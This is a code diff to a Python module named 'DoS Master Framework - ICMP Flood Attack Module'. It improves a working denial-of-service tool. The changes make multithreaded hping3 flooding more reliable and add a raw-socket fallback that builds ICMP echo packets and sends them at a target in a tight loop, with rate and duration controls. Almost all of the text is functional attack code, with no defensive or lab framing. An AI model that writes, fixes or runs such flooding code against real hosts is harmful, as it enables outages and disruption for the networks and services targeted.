@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-DoS Master Framework - ICMP Flood Attack Module
-Professional ICMP flood implementation
+DoS Master Framework - ICMP Flood Attack Module - FIXED VERSION
+Professional ICMP flood implementation with proper hping3 integration
 """
 
 import subprocess
@@ -9,6 +9,8 @@ import threading
 import time
 import socket
 import struct
+import os
+import signal
 from typing import Dict, Any
 from datetime import datetime
 
@@ -30,6 +32,7 @@ class ICMPFlood:
         self.attack_active = False
         self.start_time = None
         self.worker_threads = []
+        self.packet_lock = threading.Lock()
         
     def validate_config(self) -> bool:
         """Validate attack configuration"""
@@ -70,6 +73,7 @@ class ICMPFlood:
             # Start worker threads
             for i in range(self.threads):
                 thread = threading.Thread(target=self._icmp_worker, args=(i,))
+                thread.daemon = True
                 thread.start()
                 self.worker_threads.append(thread)
                 time.sleep(0.1)  # Stagger thread starts
@@ -79,7 +83,7 @@ class ICMPFlood:
             
             # Wait for all threads to complete
             for thread in self.worker_threads:
-                thread.join()
+                thread.join(timeout=2)
             
             # Calculate results
             end_time = time.time()
@@ -109,68 +113,227 @@ class ICMPFlood:
             self.attack_active = False
     
     def _icmp_worker(self, worker_id: int):
-        """ICMP flood worker thread"""
+        """ICMP flood worker thread - FIXED VERSION"""
         self.logger.debug(f"ICMP worker {worker_id} started")
         
+        local_packets = 0
+        
         try:
-            # Use hping3 for reliable ICMP flooding
-            cmd = [
-                'hping3',
-                '--icmp',
-                '--flood',
-                '-d', str(self.packet_size),
-                self.target
-            ]
+            # Check if hping3 exists
+            if not self._check_hping3():
+                self.logger.error("hping3 not found, falling back to Python implementation")
+                return self._python_icmp_worker(worker_id)
             
+            # Build hping3 command
             if self.rate_limit > 0:
-                # Calculate interval for rate limiting
-                interval = int(1000000 / (self.rate_limit / self.threads))  # microseconds
-                cmd.extend(['-i', f'u{interval}'])
+                # Rate limited version - more reliable
+                packets_per_second = max(1, self.rate_limit // self.threads)
+                total_packets = packets_per_second * self.duration
+                interval_ms = max(1, 1000 // packets_per_second)
+                
+                cmd = [
+                    'hping3',
+                    '--icmp',
+                    '-i', f'{interval_ms}',
+                    '-c', str(total_packets),
+                    '-d', str(self.packet_size),
+                    self.target
+                ]
+            else:
+                # Flood mode with duration limit
+                cmd = [
+                    'hping3',
+                    '--icmp',
+                    '--flood',
+                    '-d', str(self.packet_size),
+                    self.target
+                ]
+            
+            self.logger.debug(f"Worker {worker_id} command: {' '.join(cmd)}")
             
             # Start hping3 process
             process = subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
-                text=True
+                text=True,
+                preexec_fn=os.setsid  # Create process group
             )
             
-            # Monitor process
+            # Monitor process and count packets
             start_time = time.time()
+            last_check = start_time
+            
             while self.attack_active and (time.time() - start_time) < self.duration:
                 if process.poll() is not None:
                     break
+                
+                # Estimate packets based on time (for flood mode)
+                current_time = time.time()
+                if current_time - last_check >= 1.0:  # Check every second
+                    if self.rate_limit > 0:
+                        estimated_packets = int((current_time - start_time) * (self.rate_limit // self.threads))
+                    else:
+                        # Estimate based on typical flood rates
+                        estimated_packets = int((current_time - start_time) * 1000)  # ~1000 pps
+                    
+                    new_packets = estimated_packets - local_packets
+                    local_packets = estimated_packets
+                    
+                    with self.packet_lock:
+                        self.packets_sent += new_packets
+                    
+                    last_check = current_time
+                
                 time.sleep(0.1)
             
-            # Terminate process
+            # Terminate process gracefully
             if process.poll() is None:
-                process.terminate()
-                process.wait(timeout=5)
+                try:
+                    # Send SIGTERM to process group
+                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+                    process.wait(timeout=3)
+                except Exception as e:
+                    self.logger.debug(f"Graceful termination failed: {e}")
+                    try:
+                        process.kill()
+                        process.wait(timeout=1)
+                    except:
+                        pass
             
-            # Parse results from hping3 output
-            stdout, stderr = process.communicate()
-            self._parse_hping_output(stdout, worker_id)
+            # Try to get actual packet count from output
+            try:
+                stdout, stderr = process.communicate(timeout=2)
+                actual_packets = self._parse_hping_output(stdout, worker_id)
+                if actual_packets > 0:
+                    # Update with actual count if available
+                    with self.packet_lock:
+                        self.packets_sent = self.packets_sent - local_packets + actual_packets
+                    local_packets = actual_packets
+            except Exception as e:
+                self.logger.debug(f"Failed to get hping3 output: {e}")
+            
+            self.logger.debug(f"Worker {worker_id} completed: ~{local_packets} packets")
             
         except Exception as e:
             self.logger.error(f"ICMP worker {worker_id} failed: {e}")
-            
-        self.logger.debug(f"ICMP worker {worker_id} completed")
+            with self.packet_lock:
+                self.packets_failed += 1
     
-    def _parse_hping_output(self, output: str, worker_id: int):
+    def _python_icmp_worker(self, worker_id: int):
+        """Fallback Python ICMP implementation"""
+        self.logger.debug(f"Python ICMP worker {worker_id} started (fallback)")
+        
+        try:
+            # Create raw ICMP socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            
+            # ICMP packet structure
+            def create_icmp_packet():
+                # ICMP Echo Request (type=8, code=0)
+                icmp_type = 8
+                icmp_code = 0
+                icmp_checksum = 0
+                icmp_id = os.getpid() & 0xFFFF
+                icmp_seq = 1
+                
+                # Create header
+                header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+                
+                # Create payload
+                payload = b'A' * (self.packet_size - 8)  # 8 bytes for ICMP header
+                
+                # Calculate checksum
+                packet = header + payload
+                checksum = self._calculate_checksum(packet)
+                
+                # Recreate with correct checksum
+                header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
+                return header + payload
+            
+            packet = create_icmp_packet()
+            local_packets = 0
+            start_time = time.time()
+            
+            while self.attack_active and (time.time() - start_time) < self.duration:
+                try:
+                    sock.sendto(packet, (self.target, 0))
+                    local_packets += 1
+                    
+                    # Rate limiting
+                    if self.rate_limit > 0:
+                        delay = self.threads / self.rate_limit
+                        time.sleep(delay)
+                    else:
+                        time.sleep(0.001)  # Small delay to prevent overwhelming
+                        
+                except Exception as e:
+                    with self.packet_lock:
+                        self.packets_failed += 1
+                    time.sleep(0.01)
+            
+            sock.close()
+            
+            with self.packet_lock:
+                self.packets_sent += local_packets
+            
+            self.logger.debug(f"Python ICMP worker {worker_id} sent {local_packets} packets")
+            
+        except PermissionError:
+            self.logger.error(f"Worker {worker_id}: Raw socket requires root privileges")
+            with self.packet_lock:
+                self.packets_failed += 1
+        except Exception as e:
+            self.logger.error(f"Python ICMP worker {worker_id} failed: {e}")
+            with self.packet_lock:
+                self.packets_failed += 1
+    
+    def _calculate_checksum(self, data):
+        """Calculate ICMP checksum"""
+        checksum = 0
+        # Make 16 bit words out of every two adjacent bytes
+        for i in range(0, len(data), 2):
+            if i + 1 < len(data):
+                word = (data[i] << 8) + data[i + 1]
+            else:
+                word = data[i] << 8
+            checksum += word
+        
+        # Add any carry bits
+        checksum = (checksum >> 16) + (checksum & 0xFFFF)
+        checksum += checksum >> 16
+        
+        # One's complement
+        return ~checksum & 0xFFFF
+    
+    def _check_hping3(self) -> bool:
+        """Check if hping3 is available"""
+        try:
+            subprocess.run(['hping3', '--version'], capture_output=True, timeout=5)
+            return True
+        except:
+            return False
+    
+    def _parse_hping_output(self, output: str, worker_id: int) -> int:
         """Parse hping3 output to extract statistics"""
         try:
             lines = output.split('\n')
             for line in lines:
                 if 'packets transmitted' in line:
-                    # Extract packet count from hping3 statistics
+                    # Extract packet count: "5 packets transmitted"
                     parts = line.split()
-                    if len(parts) >= 3:
-                        packets = int(parts[0])
-                        self.packets_sent += packets
-                        self.logger.debug(f"Worker {worker_id}: {packets} packets sent")
-                        break
+                    for i, part in enumerate(parts):
+                        if part == 'packets' and i > 0:
+                            try:
+                                packets = int(parts[i-1])
+                                self.logger.debug(f"Worker {worker_id}: parsed {packets} packets from output")
+                                return packets
+                            except ValueError:
+                                continue
+            return 0
         except Exception as e:
             self.logger.debug(f"Failed to parse hping output: {e}")
+            return 0
     
     def _monitor_attack(self):
         """Monitor attack progress"""
